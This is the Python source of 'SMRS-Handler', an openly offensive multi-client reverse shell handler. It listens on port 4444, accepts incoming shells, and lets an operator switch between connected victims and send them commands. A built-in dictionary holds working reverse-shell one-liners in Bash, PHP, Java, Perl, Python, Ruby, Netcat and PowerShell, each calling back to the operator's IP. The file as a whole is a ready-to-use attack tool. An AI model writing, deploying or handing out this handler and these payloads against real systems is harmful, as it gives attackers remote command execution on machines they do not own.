#!/usr/bin/env python3
import socket
import threading
import sys
import select
import queue
import os
import time
from colorama import Fore, init
from pygments import highlight
from pygments.lexers import get_lexer_by_name
from pygments.formatters import TerminalFormatter

init(autoreset=True)

if os.name == 'nt':
    import msvcrt
else:
    import tty
    import termios

VERSION = "1.1.0"
IP = '127.0.0.1'
HOST = '0.0.0.0'
PORT = 4444

PROMPT = "[>] "

clients = {}
output_queues = {}
client_lock = threading.Lock()
print_lock = threading.Lock()
current_client = None
next_id = 1
current_input = ""
input_ready = False   # <-- prevent background threads from drawing prompt before main is ready

SHELLS = {
    "Bash": f'/bin/bash -i >& /dev/tcp/{IP}/{PORT} 0>&1',
    "PHP": f'php -r \'$sock=fsockopen("{IP}",{PORT});exec("/bin/sh -i <&3 >&3 2>&3");\'',
    "Java": f'r=Runtime.getRuntime()\np=r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{IP}/{PORT};cat<&5|while read line;do $line 2>&5 >&5;done"] as String[])\np.waitFor()',
    "Perl": f'perl -e \'use Socket;$i="{IP}";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh","-i");}};\'',
    "Python": f'python -c \'import socket,subprocess,os;s=socket.socket();s.connect(("{IP}",{PORT}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];p=subprocess.call(["/bin/sh","-i"]);\'',
    "Ruby": f'ruby -rsocket -e \'f=TCPSocket.open("{IP}",{PORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
    "Netcat": f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f',
    "PowerShell": f'$sm=(New-Object Net.Sockets.TCPClient("{IP}",{PORT})).GetStream();[byte[]]$b=0..255|%{{0}};while(($i=$sm.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$s=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($s,0,$s.Length)}}'
}


def _redraw_prompt():
    """Redraw prompt only when main input loop is ready to receive input."""
    if not input_ready:
        return
    sys.stdout.write('\r\033[K' + PROMPT + current_input)
    sys.stdout.flush()


def safe_print(msg: str):
    with print_lock:
        sys.stdout.write('\r\033[K' + msg.rstrip() + '\n')
        sys.stdout.flush()
        # Only background threads should call _redraw_prompt — and only if input is ready
        if threading.current_thread() is not threading.main_thread():
            _redraw_prompt()


def safe_write(data: str):
    if not data:
        return
    if isinstance(data, bytes):
        try:
            data = data.decode('utf-8', errors='ignore')
        except Exception:
            data = str(data)
    with print_lock:
        sys.stdout.write('\r\033[K' + data)
        if not data.endswith('\n'):
            sys.stdout.write('\n')
        sys.stdout.flush()
        if threading.current_thread() is not threading.main_thread():
            _redraw_prompt()


def read_line(prompt=PROMPT):
    """Cross-platform raw input with proper newline handling (no staircase)."""
    global current_input
    sys.stdout.write(prompt)
    sys.stdout.flush()
    current_input = ""
    line = ""

    if os.name == 'nt':
        while True:
            if msvcrt.kbhit():
                ch = msvcrt.getch()
                if ch in (b'\r', b'\n'):
                    sys.stdout.write('\r\n')
                    sys.stdout.flush()
                    result = line
                    current_input = ""
                    return result
                elif ch == b'\x08' and line:
                    line = line[:-1]
                    current_input = line
                    sys.stdout.write('\b \b')
                    sys.stdout.flush()
                elif ch == b'\x03':
                    raise KeyboardInterrupt
                elif ch == b'\x1a':
                    raise EOFError
                else:
                    try:
                        char = ch.decode('utf-8')
                        if char.isprintable() or char == '\t':
                            line += char
                            current_input = line
                            sys.stdout.write(char)
                            sys.stdout.flush()
                    except UnicodeDecodeError:
                        pass
    else:
        fd = sys.stdin.fileno()
        old = termios.tcgetattr(fd)
        try:
            tty.setraw(fd)
            while True:
                ch = sys.stdin.read(1)
                if ch in ('\r', '\n'):
                    sys.stdout.write('\r\n')  # ensures proper cursor reset in raw mode
                    sys.stdout.flush()
                    result = line
                    current_input = ""
                    return result
                elif ch == '\x7f' and line:
                    line = line[:-1]
                    current_input = line
                    sys.stdout.write('\b \b')
                    sys.stdout.flush()
                elif ch == '\x03':
                    raise KeyboardInterrupt
                elif ch == '\x04' and not line:
                    raise EOFError
                else:
                    line += ch
                    current_input = line
                    sys.stdout.write(ch)
                    sys.stdout.flush()
        finally:
            termios.tcsetattr(fd, termios.TCSADRAIN, old)
    return line


def banner():
    print(f"""
{Fore.RED}   _____  __  __   _____     _____{Fore.RESET}    _    _                 _ _
{Fore.RED}  / ____||  \\/  | |  __ \\   / ____|{Fore.RESET}  | |  | |               | | |
{Fore.RED} | (___  | \\  / | | |__) | | (___    {Fore.RESET}| |__| | __ _ _ __   __| | | ___ _ __
{Fore.RED}  \\___ \\ | |\\/| | |  _  /   \\___ \\{Fore.RESET}   |  __  |/ _` | '_ \\ / _` | |/ _ \\ '__|
{Fore.RED}  ____) || |  | |_| | \\ \\ _ ____) |{Fore.RESET}  | |  | | (_| | | | | (_| | |  __/ |
{Fore.RED} |_____(_)_|  |_(_)_|  \\_(_)_____(_){Fore.RESET} |_|  |_|\\__,_|_| |_|\\__,_|_|\\___|_|
 {Fore.RED}Simple Multi Reverse Shell {Fore.WHITE}Handler{Fore.RESET}
 {Fore.GREEN}By MRITARI{Fore.RESET} | Version {Fore.GREEN}{VERSION}
 {Fore.BLUE}https://github.com/MRITARI/SMRS-Handler{Fore.RESET}

{Fore.BLUE}[i]{Fore.RESET} Type {Fore.CYAN}'exit'{Fore.RESET} to quit and {Fore.CYAN}'help'{Fore.RESET} for commands.
""")


def handle_client(sock, addr, cid):
    global current_client
    q = queue.Queue()
    with client_lock:
        output_queues[cid] = q
    safe_print(f"{Fore.GREEN}[+]{Fore.RESET} Client {cid} connected from {addr}")

    try:
        while True:
            ready, _, _ = select.select([sock], [], [], 1.0)
            if ready:
                data = sock.recv(4096)
                if not data:
                    break
                q.put(data.decode('utf-8', errors='ignore'))
    except Exception:
        pass
    finally:
        with client_lock:
            sock.close()
            clients.pop(cid, None)
            output_queues.pop(cid, None)
            if current_client == cid:
                current_client = None
        safe_print(f"{Fore.RED}[-]{Fore.RESET} Client {cid} disconnected.")


def output_worker():
    while True:
        with client_lock:
            ids = list(output_queues.keys())
        for cid in ids:
            q = output_queues.get(cid)
            if q:
                try:
                    while not q.empty():
                        data = q.get_nowait()
                        if current_client == cid:
                            safe_write(data)
                except Exception:
                    pass
        threading.Event().wait(0.1)


def listener():
    global next_id, current_client
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(5)
    safe_print(f"{Fore.CYAN}[*]{Fore.RESET} Listening on {HOST}:{PORT}")

    while True:
        try:
            sock, addr = server.accept()
            sock.setblocking(False)
            with client_lock:
                cid = next_id
                clients[cid] = (sock, addr)
                next_id += 1
            threading.Thread(target=handle_client, args=(sock, addr, cid), daemon=True).start()
            if len(clients) == 1:
                current_client = cid
                safe_print(f"{Fore.CYAN}[*]{Fore.RESET} Auto-selected client {cid}")
        except Exception as e:
            safe_print(f"{Fore.YELLOW}[!]{Fore.RESET} Listener error: {e}")
            break


def interactive_shell():
    global current_client, input_ready
    # Start background threads first; they will NOT redraw the prompt until input_ready=True
    threading.Thread(target=listener, daemon=True).start()
    time.sleep(0.15)  # small pause so initial logs are printed in order
    threading.Thread(target=output_worker, daemon=True).start()

    # Now the main loop is ready to show the prompt and accept input
    input_ready = True

    while True:
        try:
            cmd = read_line(PROMPT).strip()
            if not cmd:
                continue

            if cmd == 'list':
                with client_lock:
                    if clients:
                        safe_print(f"{Fore.BLUE}[i]{Fore.RESET} Active clients:")
                        for cid, (_, addr) in clients.items():
                            mark = f"{Fore.GREEN}*{Fore.RESET}" if current_client == cid else " "
                            safe_print(f"  {mark} [{cid}] {addr[0]}:{addr[1]}")
                    else:
                        safe_print(f"{Fore.BLUE}[i]{Fore.RESET} No clients connected.")

            elif cmd.startswith('use '):
                try:
                    target = int(cmd.split(maxsplit=1)[1])
                    with client_lock:
                        if target in clients:
                            current_client = target
                            safe_print(f"{Fore.GREEN}[+]{Fore.RESET} Switched to client {target}")
                        else:
                            safe_print(f"{Fore.YELLOW}[!]{Fore.RESET} Client not found.")
                except ValueError:
                    safe_print(f"{Fore.BLUE}[i]{Fore.RESET} Usage: use <id>")

            elif cmd == 'help':
                print(f"""
{Fore.BLUE}[i]{Fore.RESET} Commands:
  list          Show connected clients
  use <id>      Switch to a client
  helpsh        Show reverse shell payloads
  clear/cls     Clear the screen
  exit/quit     Quit
                """.strip())

            elif cmd == 'helpsh':
                safe_print(f"{Fore.CYAN}-- Reverse Shell One-Liners --{Fore.RESET}")
                for lang, code in SHELLS.items():
                    lexer_name = {
                        "Bash": "bash", "PHP": "php", "Java": "java", "Perl": "perl",
                        "Python": "python", "Ruby": "ruby", "Netcat": "bash",
                        "PowerShell": "powershell"
                    }.get(lang, "text")
                    safe_print(f"{Fore.BLUE}[i]{Fore.RESET} {lang}")
                    try:
                        lexer = get_lexer_by_name(lexer_name, stripall=False)
                        print(highlight(code, lexer, TerminalFormatter()).rstrip())
                    except Exception:
                        print(code)
                    print()

            elif cmd in ('clear', 'cls'):
                os.system('cls' if os.name == 'nt' else 'clear')
                banner()

            elif cmd in ('exit', 'quit'):
                safe_print(f"{Fore.BLUE}[i]{Fore.RESET} Shutting down...")
                with client_lock:
                    for sock, _ in list(clients.values()):
                        try:
                            sock.close()
                        except Exception:
                            pass
                break

            else:
                if current_client and current_client in clients:
                    sock, _ = clients[current_client]
                    try:
                        sock.send((cmd + '\n').encode('utf-8'))
                    except Exception:
                        safe_print(f"{Fore.YELLOW}[!]{Fore.RESET} Failed to send command.")
                else:
                    safe_print(f"{Fore.YELLOW}[!]{Fore.RESET} No client selected. Use 'use <id>' first.")

        except (KeyboardInterrupt, EOFError):
            safe_print(f"{Fore.BLUE}[i]{Fore.RESET} Use 'exit' to quit.")
        except Exception as e:
            safe_print(f"{Fore.RED}[Error]{Fore.RESET} {e}")


if __name__ == "__main__":
    banner()
    try:
        interactive_shell()
    except KeyboardInterrupt:
        safe_print(f"{Fore.BLUE}[i]{Fore.RESET} Shutting down...")
